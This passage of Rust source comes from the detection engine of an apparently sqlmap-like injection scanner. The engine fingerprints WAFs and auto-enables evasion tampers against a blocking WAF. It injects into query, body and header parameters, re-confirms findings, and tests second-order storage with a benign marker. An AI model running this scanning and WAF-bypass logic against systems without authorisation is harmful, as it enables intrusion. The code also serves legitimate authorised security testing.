                        // Sortie propre : ni compté ni warn.
                    }
                    BaselineOutcome::TransportFailed(msg) => {
                        warn!(error=%msg, "baseline request failed");
                        // A request was sent: count it so `--request-budget`
                        // cannot be bypassed by failing baselines.
                        self.state.write().await.increment_requests();
                    }
                }
                if samples.len() >= 3 {
                    break;
                }
            }
        }
        if samples.is_empty() {
            // Clear the spinner line so the log stays clean (`ing` → `ed`
            // is reported via the `warn!`/`Err` below, not a stale bar).
            pb.finish_and_clear();
            if self.cancel.is_cancelled() {
                return Ok(None);
            }
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "baseline failed: no successful responses from target after 3 attempts",
                ),
            )));
        }
        pb.finish_and_clear();
        let mut baseline = baseline::Baseline::new(&samples);
        // CT-mismatch (P0-4): a `--raw-file` API call (`Content-Type:
        // application/json`) answered with HTML/text means a challenge/deny
        // page intercepted the call. Presence-level alone, blocking only
        // with a corroborating status (see `Baseline::apply_ct_mismatch`).
        if let Some(expected_ct) = raw_request.and_then(|r| r.content_type()) {
            baseline.apply_ct_mismatch(&samples, expected_ct);
        }
        {
            let req_done = self.state.read().await.request_count();
            let req_delta = req_done.saturating_sub(req_before);
            // Status codes are logged so a `blocking=true` verdict stays
            // auditable (e.g. one corroborated 403 among 200s explains the
            // WAF warn below without a body dump).
            let statuses: Vec<u16> = baseline.status_codes.clone();
            info!(
                elapsed_s = phase_started.elapsed().as_secs_f64(),
                requests = req_delta,
                statuses = ?statuses,
                "baseline done in {:.1}s, {req_delta} req (statuses: {statuses:?})",
                phase_started.elapsed().as_secs_f64(),
            );
            // Origin erroring behind the CDN (CF 520–524, 5xx): every
            // differential below compares static error pages, so a full
            // detection run is void by construction — say so loudly instead
            // of burning the budget silently. Scan continues (transient
            // blips happen) but the verdict must be read as "unreachable",
            // never as "not injectable".
            if baseline_all_error(&statuses) {
                warn!(
                    statuses = ?statuses,
                    "baseline: all samples server-error (5xx) — origin unreachable, detection differentials will be meaningless"
                );
            }
        }
        // C6 trace: baseline samples as hashes only (never clear body/headers).
        // Guarantees a non-empty RAM-only trace even on clean targets.
        {
            let mut st = self.state.write().await;
            for (idx, sample) in samples.iter().enumerate() {
                let seq = st.next_trace_seq();
                let req_hash = crate::reasoning::trace::hash_str_hex(&format!(
                    "baseline:{idx}:{}",
                    target.as_str()
                ));
                let resp_hash = crate::reasoning::trace::hash_sha256_hex(sample.body.as_slice());
                #[allow(clippy::cast_precision_loss)]
                let ms = sample.duration.as_secs_f64() * 1000.0;
                st.push_trace(crate::reasoning::ProbeRecord::new(
                    seq,
                    "baseline",
                    "baseline",
                    "none",
                    self.config.seed,
                    req_hash,
                    resp_hash,
                    0.0,
                    ms,
                ));
            }
        }
        if baseline.is_waf_blocked() {
            warn!(
                target=%self.scrubber.scrub(target.as_str()),
                "possible WAF detected (repeated 403/406)"
            );
        }
        // Blocking WAF = actionable warn; mere CDN presence (e.g. `cf-ray`
        // on a normal 200, `blocking=false`) = informational `info!` so a
        // `cloudflare` fingerprint doesn't read as an attack blocked.
        if baseline.is_waf_blocking() {
            warn!(
                target=%self.scrubber.scrub(target.as_str()),
                vendor=%baseline.waf_vendor.as_deref().unwrap_or("unknown"),
                hits=%baseline.waf_hits.join(","),
                blocking=true,
                "WAF blocking signals detected (challenge/deny/rate-limit)"
            );
        } else if baseline.is_waf_suspected() {
            info!(
                target=%self.scrubber.scrub(target.as_str()),
                vendor=%baseline.waf_vendor.as_deref().unwrap_or("unknown"),
                hits=%baseline.waf_hits.join(","),
                blocking=false,
                "CDN/WAF fingerprinted (informational, no block)"
            );
        }
        // Effective tampers: only an active WAF block auto-enables a bypass.
        // Mere CDN presence (for example `cf-ray` on a normal 200 response)
        // remains informational and must not alter probe semantics. A bare
        // `403/406/429` count without vendor/marker corroboration (app auth,
        // content negotiation, self-induced 429 at high `--threads`) must not
        // auto-tamper either — that would poison probes and bypass the cache.
        let waf_corroborated = baseline.is_waf_blocking() || baseline.is_waf_suspected();
        let effective_tampers: Vec<Tamper> = if (baseline.is_waf_blocking()
            || (baseline.is_waf_blocked() && waf_corroborated))
            && self.config.evasion.tampers.is_empty()
        {
            info!(
                "WAF suspected and no --tamper given — auto-enabling space2comment,randomcase for detection"
            );
            waf_auto_tampers()
        } else {
            self.config.evasion.tampers.clone()
        };
        if !effective_tampers.is_empty() {
            info!(
                tampers=?effective_tampers.iter().map(super::super::techniques::tamper::Tamper::name).collect::<Vec<_>>(),
                "WAF tampers active"
            );
        }
        let effective_opts = ProbeOpts::new(self.config.evasion.hpp, self.config.evasion.chunked);
        if effective_opts.is_active() {
            info!(hpp=%effective_opts.hpp, chunked=%effective_opts.chunked, "request-level tampers active");
        }
        Ok(Some((baseline, effective_tampers, effective_opts)))
    }

    /// Builds the marker-synthetic + real parameter list to test, applying
    /// `-p` filtering (skipped when a recon `candidate_param` is already fixed).
    ///
    /// Emplacements exotiques (`User-Agent` / `Referer` / `X-Forwarded-For` /
    /// `X-Real-IP`, souvent loggés en base sans sanitisation → second-order
    /// via header) : ajoutés comme synthétiques à partir du `--level 2`
    /// quand absents des params déjà collectés. L1 reste byte-identique
    /// (aucune requête extra par défaut, même philosophie que sqlmap qui ne
    /// teste UA/Referer qu'à haut niveau).
    fn select_params(
        &self,
        target_str: &str,
        target: &TargetUrl,
        raw_request: Option<&RawRequest>,
        candidate_param: Option<&TargetParameter>,
    ) -> (MarkerSet, Vec<TargetParameter>) {
        let marker_set = self.effective_marker_set(target_str);
        let mut params = Vec::new();
        // Marker mode: synthetic params, but also test real query params (don't ignore them)
        if marker_set.asterisk {
            params.push(TargetParameter::new(
                "marker_asterisk",
                ParameterLocation::Query,
                "*",
            ));
        }
        if marker_set.section {
            params.push(TargetParameter::new(
                "marker_section",
                ParameterLocation::Query,
                "§",
            ));
        }
        if marker_set.double_brace {
            params.push(TargetParameter::new(
                "marker_brace",
                ParameterLocation::Query,
                "{{}}",
            ));
        }
        // Always include real query params even when markers present (fixes #6)
        params.extend(crate::target::parameters::collect_from_url_query(target));
        // Body params from --raw-file or --data (synthetic raw)
        if let Some(raw) = raw_request {
            params.extend(crate::target::parameters::collect_from_raw_request(raw));
        }
        // Exotic headers (L2+) : UA/Referer/XFF souvent oubliés, loggés en base.
        if self.config.budget.level >= 2 && candidate_param.is_none() {
            let exotic = crate::target::parameters::synthetic_exotic_headers(&params);
            if !exotic.is_empty() {
                info!(
                    count = exotic.len(),
                    "exotic header params added (level>=2: User-Agent/Referer/X-Forwarded-For)"
                );
                params.extend(exotic);
            }
        }
        let mut to_test: Vec<TargetParameter> = if let Some(param) = candidate_param.cloned() {
            vec![param]
        } else if params.is_empty() {
            vec![TargetParameter::new("id", ParameterLocation::Query, "1")]
        } else {
            params
        };
        // `-p` selection (candidate_param from recon always wins and skips the filter)
        if candidate_param.is_none() && !self.config.test_params.is_empty() {
            let before = to_test.len();
            to_test = filter_params(to_test, &self.config.test_params);
            if to_test.is_empty() {
                warn!(
                    filter=?self.config.test_params,
                    before,
                    "parameter filter matched 0 params — nothing to test"
                );
            } else {
                info!(filter=?self.config.test_params, before, after=%to_test.len(), "parameter filter applied");
            }
        }
        (marker_set, to_test)
    }

    /// Runs boolean/error/time/union/stacked/json/nosql/oob detection for every
    /// candidate parameter with bounded concurrency (respects `--threads`).
    /// Minimal C3 loop: one [`Hypothesis`] per (param, technique) seeded by
    /// `compute_calibrated_prior(context, dbms_belief)`; each
    /// `test_*_bounded` outcome maps to `record_probe/record_trial/
    /// record_waf_penalty`; prune at `posterior <= 0.04`, confirm at
    /// `>= 0.85 + trials_passed > 0`. `Finding` emission is unchanged.
    /// `context_probes` (the `<=8` adaptive probes) seeds every per-parameter
    /// scheduler budget so the global cost stays visible in `budget_spent`
    /// from the first `pop` (the true cross-param total is
    /// `SessionState::request_count`).
    #[allow(clippy::too_many_arguments)]
    async fn run_detection(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        context: &InjectionContext,
        dbms_belief: &DbmsBelief,
        context_probes: usize,
        to_test: Vec<TargetParameter>,
    ) {
        let pb2 = if to_test.len() > 1 {
            Arc::new(progress_bar(to_test.len() as u64))
        } else {
            Arc::new(indicatif::ProgressBar::hidden())
        };
        let concurrency = self.config.budget.threads.clamp(1, 32);
        let detection_started = Instant::now();
        let shared = Arc::new(DetectionShared {
            target: target.clone(),
            target_str: target_str.to_owned(),
            marker_set: marker_set.clone(),
            baseline: baseline.clone(),
            tampers: effective_tampers.to_vec(),
            context: context.clone(),
            dbms_belief: dbms_belief.clone(),
            context_probes,
            started: detection_started,
        });
        let stream = futures::stream::iter(to_test)
            .map(|param| {
                let shared = Arc::clone(&shared);
                let client = self.client.clone();
                let state = Arc::clone(&self.state);
                let cancel = self.cancel.clone();
                let config = self.config.clone();
                let pb2 = Arc::clone(&pb2);
                let raw_request = Arc::clone(raw_request);
                async move {
                    run_detection_for_param(
                        &client,
                        &state,
                        &cancel,
                        &config,
                        &shared,
                        &raw_request,
                        &param,
                    )
                    .await;
                    pb2.inc(1);
                }
            })
            .buffer_unordered(concurrency);

        stream.collect::<Vec<()>>().await;
        // Clear the bar so the `detection done in …` summary logged by the
        // caller stays on a clean line (no `████ 1/1 …` glued to logs).
        // Single global bar (X/Y over blind spinner); hidden when stderr
        // is not a TTY (MCP/CI), where it would only spam + burn CPU.
        pb2.finish_and_clear();
    }

    /// C6 strict second-pass (real, not a `warn!`).
    ///
    /// Re-sonde confirmed findings with fresh payloads + derived seed
    /// (`derive_confirm_seed(base, idx)`), OOB excluded. [`ConfirmScope::All`]
    /// (`--confirm`) covers every confirmed finding and documents the ~2x
    /// request worst-case; [`ConfirmScope::MediumRisk`] (default) covers only
    /// findings below the `High` bucket (bounded anti-FP, 0 request when the
    /// snapshot holds none). Never creates new findings — only drops those
    /// that fail re-validation, so N1/N2 stay at 0 FP by construction.
    /// Inconclusive outcomes (transport error, `--ignore-code`, cancel) keep
    /// the finding (fail-open toward the first pass, fail-closed toward new
    /// FPs).
    ///
    /// C5-tardif extension (`--confirm` only): after a finding is re-validated
    /// (`ok == true`), the mini-mutation ([`crate::mutation`]) probes ≤4
    /// deterministic variants (1 request each, `mutation:<famille>` traced,
    /// silent failure). The mutation never runs in first-pass detection, never
    /// on unconfirmed findings, never under WAF blocking, never when
    /// `--no-mutation` is set, and never in the automatic medium-risk scope.
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_confirm_second_pass(
        &self,
        target: &TargetUrl,
        target_str: &str,
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
        effective_tampers: &[Tamper],
        effective_opts: ProbeOpts,
        context: &InjectionContext,
        dbms_belief: &DbmsBelief,
        detection_started: std::time::Instant,
        scope: ConfirmScope,
    ) {
        let snapshot = self.state.read().await.findings().to_vec();
        let candidates: Vec<(usize, Finding)> = snapshot
            .into_iter()
            .enumerate()
            .filter(|(_, f)| in_confirm_scope(f, scope))
            .collect();
        if candidates.is_empty() {
            match scope {
                ConfirmScope::All => {
                    debug!(
                        "--confirm second-pass: no confirmed non-OOB findings, 0 extra requests"
                    );
                }
                ConfirmScope::MediumRisk => debug!(
                    "auto second-pass (medium-risk, non-high): no candidates, 0 extra requests"
                ),
            }
            return;
        }
        match scope {
            ConfirmScope::All => info!(
                count = candidates.len(),
                "--confirm second-pass start (OOB excluded)"
            ),
            ConfirmScope::MediumRisk => info!(
                count = candidates.len(),
                "auto second-pass (medium-risk, non-high) start (OOB excluded)"
            ),
        }
        let plan = mutation_plan_label(effective_tampers);
        for (idx, finding) in candidates {
            if self.cancel.is_cancelled() {
                break;
            }
            let derived = crate::reasoning::derive_confirm_seed(self.config.seed, idx);
            let param = param_from_finding(&finding);
            let ok = confirm_finding_second_pass(
                &self.client,
                &self.state,
                &self.cancel,
                target,
                target_str,
                &param,
                &finding,
                marker_set,
                raw_request.as_ref().as_ref(),
                baseline,
                effective_tampers,
                &plan,
                effective_opts,
                &self.config.evasion.payload_opts,
                &self.config.matcher,
                &self.config.net.ignore_codes,
                derived,
                context,
                self.config.budget.level,
            )
            .await;
            if ok {
                info!(
                    param = %finding.parameter,
                    technique = %finding.technique,
                    "--confirm re-validated"
                );
                // Link the finding to its confirm trace (opaque hash ref).
                let trace_ref = {
                    let st = self.state.read().await;
                    st.trace().records_for(&finding.parameter).last().map(|r| {
                        format!(
                            "confirm#{}:{}",
                            r.seq,
                            r.request_hash.chars().take(16).collect::<String>()
                        )
                    })
                };
                if let Some(tref) = trace_ref {
                    let mut st = self.state.write().await;
                    if let Some(f) = st.findings_mut().iter_mut().find(|x| {
                        x.parameter == finding.parameter && x.technique == finding.technique
                    }) {
                        let current = f.evidence.clone();
                        if !current.contains("confirm=second-pass") {
                            f.evidence = format!("{current} confirm=second-pass");
                        }
                        f.evidence_detail.trace_ref = Some(tref);
                    }
                }
                // C5-tardif mini-mutation (`--confirm` only: the mutation is
                // tied to the explicit flag): confirmed-only, bounded, seeded,
                // traced, silent failure (never drops the finding).
                if scope == ConfirmScope::All {
                    run_mutation_for_finding(
                        &self.client,
                        &self.state,
                        &self.cancel,
                        target,
                        target_str,
                        &param,
                        &finding,
                        marker_set,
                        raw_request.as_ref().as_ref(),
                        baseline,
                        effective_tampers,
                        effective_opts,
                        &self.config.evasion.payload_opts,
                        &self.config.matcher,
                        context,
                        self.config.no_mutation,
                        derived,
                    )
                    .await;
                }
            } else {
                warn!(
                    param = %finding.parameter,
                    technique = %finding.technique,
                    "--confirm re-validation failed, dropping finding (was likely FP)"
                );
                let mut st = self.state.write().await;
                st.findings_mut().retain(|x| {
                    !(x.parameter == finding.parameter && x.technique == finding.technique)
                });
                drop(st);
                // `--ai-suggest` post-confirm (opt-in) : le finding droppé
                // rouvre une seconde chance bornée avec des formes inédites
                // (trigger `confirm_dropped`). Gate interne : 0 requête quand
                // OFF/déjà-tenté/sous verrou ; échec silencieux.
                if self.config.ai.enabled && !self.cancel.is_cancelled() {
                    let ai_deadline = BudgetConfig::detection_deadline(
                        detection_started,
                        self.config.budget.max_duration_secs,
                    );
                    run_ai_suggest_for_param(
                        &self.client,
                        &self.state,
                        &self.cancel,
                        &self.config,
                        target,
                        target_str,
                        &param,
                        baseline,
                        marker_set,
                        raw_request.as_ref().as_ref(),
                        effective_tampers,
                        effective_opts,
                        &self.config.evasion.payload_opts,
                        &self.config.matcher,
                        &self.config.net.ignore_codes,
                        derived,
                        context,
                        dbms_belief,
                        ai_deadline,
                        true,
                    )
                    .await;
                }
            }
        }
        match scope {
            ConfirmScope::All => info!("--confirm second-pass done"),
            ConfirmScope::MediumRisk => info!("auto second-pass done"),
        }
    }

    /// Option B second-order actif borné (lab only, même-origine).
    ///
    /// Stocke un marqueur bénin jetable (`u+8hex`, payload `'<marker>'`
    /// style union — jamais de RCE, jamais de stacked exec) sur
    /// ≤`max_stores` params Body/Query/Header, puis revisite `revisit_url`
    /// (1 store + max 2 GET séquentiels par param, `RequestClass::Default`).
    /// Les headers exotiques (`User-Agent`/`X-Forwarded-For`/`Referer`,
    /// souvent loggés en base) suivent le même chemin que Body/Query.
    /// `TechniqueKind::Union` réutilisé (pas de nouveau kind → reporting
    /// inchangé) ; `push_stored()` systématique même sans confirmation
    /// (audit passif) ; trace = hashes seuls (`hash_str_hex`), jamais de
    /// marqueur en clair dans les logs.
    ///
    /// Gates anti-FP : même-origine stricte (schéma/host/port), abort si le
    /// body baseline contient déjà le marqueur, finding seulement si 2/2
    /// revisits en 200 non-ignoré reflètent le marqueur (confidence 0.85,
    /// FP 0.15, evidence `second-order stored marker reflected
    /// confirm=second-pass`).
    ///
    /// # Errors
    /// Retourne `InjektError::Other` si `--second-order-revisit-url` est
    /// absent/vide, si le revisit n'est pas même-origine que la cible, ou si
    /// sa résolution DNS-time échoue (même garde que `run_internal`).
    #[allow(clippy::too_many_arguments, clippy::too_many_lines)]
    async fn run_second_order(
        &self,
        target: &TargetUrl,
        target_str: &str,
        to_test: &[TargetParameter],
        marker_set: &MarkerSet,
        raw_request: &Arc<Option<RawRequest>>,
        baseline: &baseline::Baseline,
    ) -> crate::error::Result<()> {
        if !self.config.second_order.enabled {
            return Ok(());
        }
        let revisit_raw = self
            .config
            .second_order
            .revisit_url
            .clone()
            .unwrap_or_default();
        let revisit_raw = revisit_raw.trim().to_owned();
        if revisit_raw.is_empty() {
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "--second-order requires --second-order-revisit-url (same-origin path, e.g. /admin)",
                ),
            )));
        }
        // Résolution contre le host cible : chemin (`/admin`) → absolu
        // même-origine ; URL absolue → vérifiée même-origine ci-dessous.
        let revisit_absolute = if revisit_raw.contains("://") {
            revisit_raw.clone()
        } else {
            let path = if revisit_raw.starts_with('/') {
                revisit_raw.clone()
            } else {
                format!("/{revisit_raw}")
            };
            let Some(host) = target.inner().host_str() else {
                return Err(crate::error::InjektError::Other(Box::new(
                    std::io::Error::other("second-order: target has no host"),
                )));
            };
            let port_part = target
                .inner()
                .port()
                .map_or_else(String::new, |p| format!(":{p}"));
            format!("{}://{host}{port_part}{path}", target.inner().scheme())
        };
        // Même-origine stricte : schéma + host (insensible à la casse) +
        // port effectif identiques, sinon erreur (pas de SSRF inter-host).
        let revisit_target = TargetUrl::parse(&revisit_absolute, self.config.net.allow_private)
            .map_err(|e| {
                crate::error::InjektError::Other(Box::new(std::io::Error::other(format!(
                    "second-order revisit parse failed: {e}"
                ))))
            })?;
        let same_scheme = revisit_target.inner().scheme() == target.inner().scheme();
        let same_host = revisit_target
            .inner()
            .host_str()
            .zip(target.inner().host_str())
            .is_some_and(|(a, b)| a.eq_ignore_ascii_case(b));
        let same_port = revisit_target.inner().port_or_known_default()
            == target.inner().port_or_known_default();
        if !(same_scheme && same_host && same_port) {
            return Err(crate::error::InjektError::Other(Box::new(
                std::io::Error::other(
                    "second-order revisit must be same-origin as target (scheme/host/port)",
                ),
            )));
        }
        // Même garde DNS-time que `run_internal` : sauf `remote_dns`
        // (`socks5h://`, le proxy résout à distance), on résout localement.
        if !self.config.net.allow_private
            && !self.config.net.remote_dns
            && let Some(host) = revisit_target.inner().host_str()
        {
            TargetUrl::resolve_and_check(host, false)
                .await
                .map_err(|e| crate::error::InjektError::Other(Box::new(e)))?;
        }
        // WAF bloquant : 0 requête extra (même règle que la détection).
        if baseline.is_waf_blocking() {
            warn!(
                target=%self.scrubber.scrub(target_str),
                "second-order skipped (WAF blocking baseline)"
            );
            return Ok(());
        }
        let max_stores = self.config.second_order.max_stores.clamp(1, 32);
        // Body/Query + Header (UA/XFF/Referer souvent loggés en base sans
        // sanitisation → second-order via header). `Cookie` exclu : le jar
        // persistant rejouerait le marqueur sur les revisits et fausserait
        // le 2/2 (auto-réflexion, pas stockage serveur).
        let candidates: Vec<TargetParameter> = to_test
            .iter()
            .filter(|p| {
                matches!(
                    p.location,
                    ParameterLocation::Query
                        | ParameterLocation::Body
                        | ParameterLocation::Header(_)
                )
            })
            .take(max_stores)
            .cloned()
            .collect();
        if candidates.is_empty() {
            debug!("second-order: no Body/Query/Header params to store, 0 extra requests");
            return Ok(());
        }
        info!(
            count = candidates.len(),
            revisit = %self.scrubber.scrub(&revisit_absolute),
            "second-order active start (lab only, same-origin, benign marker)"
        );
        let baseline_body = baseline.representative_body_str();
        let ignore_codes = self.config.net.ignore_codes.clone();
        let store_url_hash = crate::reasoning::trace::hash_str_hex(target.as_str());
        let revisit_hash = crate::reasoning::trace::hash_str_hex(&revisit_absolute);
        for param in &candidates {
            if self.cancel.is_cancelled() {
                break;
            }
            if baseline.is_waf_blocking() {
                break;
            }
            // Marqueur bénin jetable `u+8hex` (même format que les payloads
            // union existants) ; jamais loggé en clair, hashes seuls en trace.
            let hex8: String = uuid::Uuid::new_v4()
                .simple()
                .to_string()
                .chars()
                .take(8)
                .collect();
            let marker_clear = format!("u{hex8}");
            // Gate anti-FP : marqueur déjà présent au baseline → on saute ce
            // param (écho naturel, pas une réflexion stockée).
            if baseline_body.contains(&marker_clear) {
                continue;
            }
            // Audit passif systématique, même si la confirmation échoue.
            {
                let mut st = self.state.write().await;
                st.push_stored(crate::session::state::StoredProbe::new(
                    param.key(),
                    secrecy::SecretString::from(marker_clear.clone()),
                    store_url_hash.clone(),
                ));
            }
            // Store : payload bénin `'<marker>'` style union (pas de RCE,
            // pas de stacked exec), chemin d'injection existant.
            let payload = format!("'{marker_clear}'");
            let Some(store_spec) = build_injection_spec_with_raw(
                target,
                target_str,
                param,
                &payload,
                marker_set,
                raw_request.as_ref().as_ref(),
                ProbeOpts::new(false, false),
                &self.config.evasion.payload_opts,
            ) else {
                warn!(param=%param.key(), "second-order store spec build failed, skipping param");
                continue;
            };
            let start = Instant::now();
            let store_resp = self
                .client
                .send_with_retry_for_class(store_spec, RequestClass::Default, &self.cancel)
                .await;
            let store_ms = start.elapsed().as_secs_f64() * 1000.0;
            self.state.write().await.increment_requests();
            let store_ok = match store_resp {
                Ok(r) => {
                    match self
                        .client
                        .read_body_string_for_class(r, RequestClass::Default)
                        .await
                    {
                        Ok(body) => {
                            let mut st = self.state.write().await;
                            let seq = st.next_trace_seq();
                            st.push_trace(crate::reasoning::ProbeRecord::new(
                                seq,
                                param.key(),
                                "union",
                                "second-order:store",
                                self.config.seed,
                                crate::reasoning::trace::hash_str_hex(&payload),
                                crate::reasoning::trace::hash_str_hex(&body),
                                0.0,
                                store_ms,
                            ));
                            true
                        }
                        Err(e) => {
                            warn!(error=%e, "second-order store body read failed");
                            let mut st = self.state.write().await;
                            let seq = st.next_trace_seq();
                            st.push_trace(crate::reasoning::ProbeRecord::new(
                                seq,
                                param.key(),
                                "union",
                                "second-order:store",
                                self.config.seed,
                                crate::reasoning::trace::hash_str_hex(&payload),
                                crate::reasoning::trace::hash_str_hex(""),
                                0.0,
                                store_ms,
                            ));
                            false
                        }
                    }
                }
                Err(e) => {
                    warn!(error=%e, "second-order store request failed");
                    let mut st = self.state.write().await;
                    let seq = st.next_trace_seq();
                    st.push_trace(crate::reasoning::ProbeRecord::new(
                        seq,
                        param.key(),
                        "union",
                        "second-order:store",
                        self.config.seed,
                        crate::reasoning::trace::hash_str_hex(&payload),
                        crate::reasoning::trace::hash_str_hex(""),
                        0.0,
                        store_ms,
                    ));
                    false
                }
            };
            if !store_ok {
                continue;
            }
            // Revisits : max 2 GET séquentiels, `RequestClass::Default`.
            // Exige 2/2 hits (status 200 + non-ignoré + reflet marqueur).
            let mut hits = 0usize;
            for _ in 0..2 {
                if self.cancel.is_cancelled() {
                    break;
                }
                if baseline.is_waf_blocking() {
                    break;
                }
                let start = Instant::now();
                let resp = self
                    .client
                    .send_with_retry_for_class(
                        RequestSpec::get(revisit_absolute.clone()),
                        RequestClass::Default,
                        &self.cancel,
                    )
                    .await;
                let ms = start.elapsed().as_secs_f64() * 1000.0;
                self.state.write().await.increment_requests();
                match resp {
                    Ok(r) => {
                        let status = r.status().as_u16();
                        match self
                            .client
                            .read_body_string_for_class(r, RequestClass::Default)
                            .await
                        {
                            Ok(body) => {
                                let hit = status == 200
                                    && !is_ignored(status, &ignore_codes)
                                    && body.contains(&marker_clear);
                                if hit {
                                    hits += 1;
                                }
                                let mut st = self.state.write().await;
                                let seq = st.next_trace_seq();
                                st.push_trace(crate::reasoning::ProbeRecord::new(
                                    seq,
                                    param.key(),
                                    "union",
                                    "second-order:revisit",
                                    self.config.seed,
                                    crate::reasoning::trace::hash_str_hex(&revisit_absolute),
                                    crate::reasoning::trace::hash_str_hex(&body),
                                    f64::from(u8::from(hit)),
                                    ms,
                                ));
                            }
                            Err(e) => {
                                warn!(error=%e, "second-order revisit body read failed");
                            }
                        }
                    }
                    Err(e) => {
                        warn!(error=%e, "second-order revisit request failed");
                    }
                }
            }
            if hits >= 2 {
                let evidence = format!(
                    "second-order: second-order stored marker reflected confirm=second-pass param={} revisit_hash={revisit_hash} store_hash={store_url_hash}",
                    param.key(),
                );
                let finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Union,
                    0.85,
                    evidence,
                )
                .with_false_positive_prob(0.15)
                .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
                self.state.write().await.push_finding(finding);
                info!(
                    param=%self.scrubber.scrub(&param.key()),
                    "second-order stored marker reflected (2/2 revisits)"
                );
            } else {
                debug!(
                    param=%self.scrubber.scrub(&param.key()),
                    hits,
                    "second-order revisit miss"
                );
            }
        }
        info!("second-order active done");
        Ok(())
    }
}

/// Shared immutable detection inputs cloned once per `run_detection`.
#[derive(Debug, Clone)]
struct DetectionShared {
    target: TargetUrl,
    target_str: String,
    marker_set: MarkerSet,
    baseline: baseline::Baseline,
    tampers: Vec<Tamper>,
    context: InjectionContext,
    dbms_belief: DbmsBelief,
    /// Adaptive context probes already spent (`<=8` by `MAX_CONTEXT_PROBES`):
    /// seeded into every per-parameter scheduler budget.
    context_probes: usize,
    /// Shared detection clock for `--max-duration` (Phase 3): set once in
    /// `run_detection`, read in every `run_detection_for_param` iteration.
    /// Starts AFTER baseline + context, so `--max-duration` covers detection
    /// loops only — never the total run (documented in `--help`).
    started: Instant,
}

/// Detection scheduling helpers moved to `super::schedule` (P1).
pub(crate) use super::schedule::{
    build_scheduler_for_param, check_deadline, dbms_payload_label, detection_order,
    is_technique_enabled, log_scheduler_state, mutation_plan_label, parse_finding_dbms,
};

/// Per-parameter C3+C4 loop: 7 hypotheses seeded by calibrated priors, each
/// `test_*_bounded` outcome mapped to probe/trial/WAF updates. Findings stay
/// untouched; prune/confirm only gate logging + early skip of terminal hyps.
///
/// [`detection_order`] only sets the creation order so the JSON / ORDER BY
/// context feeds priors (EVI input), while execution follows scheduler
/// `score = EVI * 1.0 / cost` via [`Scheduler::pop`] (budget + [`EarlyStop`]
/// gated). Payload volume per technique stays enveloped by
/// `payload_budget(level, ..)` inside `test_*_bounded`.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn run_detection_for_param(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
) {
    if cancel.is_cancelled() {
        return;
    }
    let param_key = param.key();
    let mut hyps: Vec<Hypothesis> = detection_order(&shared.context)
        .iter()
        .map(|kind| {
            Hypothesis::new(
                param_key.clone(),
                *kind,
                shared.dbms_belief.clone(),
                shared.context.clone(),
            )
        })
        .collect();
    let mut scheduler = build_scheduler_for_param(
        config,
        &param_key,
        &hyps,
        shared.context_probes,
        shared.baseline.mean_ms,
    );
    log_scheduler_state(&scheduler, &param_key, "start");
    let mut executed_kinds: Vec<TechniqueKind> = Vec::with_capacity(hyps.len());
    // Live belief: starts as the adaptive `<=8`-probe belief, then any
    // confirmed technique with a DBMS label (`>= 0.85` bar, same as
    // `fill_missing_dbms`) promotes it for the *next* tour on this param.
    // Payload selection reads `live_shared` (not the frozen `shared`), so
    // quote/comment styles stay quote-correct without re-spraying generics.
    let mut live_shared = shared.clone();
    while let Some(probe) = scheduler.pop() {
        if cancel.is_cancelled() {
            break;
        }
        // Phase 3 `--max-duration`: budget temps global partagé (voir
        // `DetectionShared::started`). `None` = illimité, byte-identique.
        if BudgetConfig::is_over_max_duration(shared.started, config.budget.max_duration_secs) {
            warn!(
                param = param_key,
                max_duration_secs = ?config.budget.max_duration_secs,
                "max-duration exceeded, stopping detection early"
            );
            break;
        }
        // CODE calibration `--request-budget`: plafond global OPT-IN sur le
        // `request_count` partagé (les schedulers sont per-param : seul ce
        // compteur global borne le total N1/N2). `None` = illimité,
        // byte-identique (le helper court-circuite sans lock supplémentaire
        // au-delà de ce `read`). Coopératif : la technique en cours finit,
        // aucune nouvelle ne démarre, fin en `Inconclusive` sans finding
        // (ni erreur, ni finding inventé). Un léger dépassement reste possible sous
        // concurrence (un tour par param en vol).
        {
            let spent = state.read().await.request_count();
            if BudgetConfig::is_over_request_budget(spent, config.budget.request_budget) {
                warn!(
                    param = param_key,
                    request_budget = ?config.budget.request_budget,
                    requests = spent,
                    "request-budget exceeded, stopping detection early"
                );
                break;
            }
        }
        let Some(hyp) = hyps.iter_mut().find(|h| h.technique == probe.technique) else {
            continue;
        };
        // Never prune before the first probe: OOB prior (0.02) starts below
        // the refuted threshold but still deserves its gated run.
        if hyp.cost_spent > 0 && hyp.is_refuted() {
            debug!(param = param_key, technique = %hyp.technique, posterior = hyp.posterior, "hypothesis pruned, skipping technique");
            continue;
        }
        if hyp.cost_spent > 0 && hyp.is_terminal() {
            continue;
        }
        // Per-family veto streak: a new technique family starts with a fresh
        // negative counter, so the N1/N2 veto only *arms* on a single
        // family spending >= 25 negative requests — and `Scheduler::pop`
        // additionally gates enforcement on a full pass (B1), so an armed
        // veto never blocks never-attempted families (boolean-negative !=
        // nosql-negative; cross-family starvation would be a silent false
        // negative). `confirmed` survives (only `reset_for_new_param`
        // clears it).
        scheduler.early_stop_mut().reset_negative_streak();
        let before_cost = hyp.cost_spent;
        run_one_technique(
            client,
            state,
            cancel,
            config,
            &live_shared,
            raw_request,
            param,
            hyp,
        )
        .await;
        executed_kinds.push(probe.technique);
        let spent_delta = hyp.cost_spent.saturating_sub(before_cost).max(1);
        let confirmed = hyp.is_confirmed();
        let refuted = hyp.is_refuted();
        let posterior = hyp.posterior;
        let technique = hyp.technique;
        let trials = hyp.trials_passed;
        let (top_kind, top_prob) = hyp.dbms_belief.top_candidate();
        scheduler.record_outcome(&param_key, confirmed, spent_delta);
        // `>= 0.85` DBMS promotion becomes the prior for the next tour:
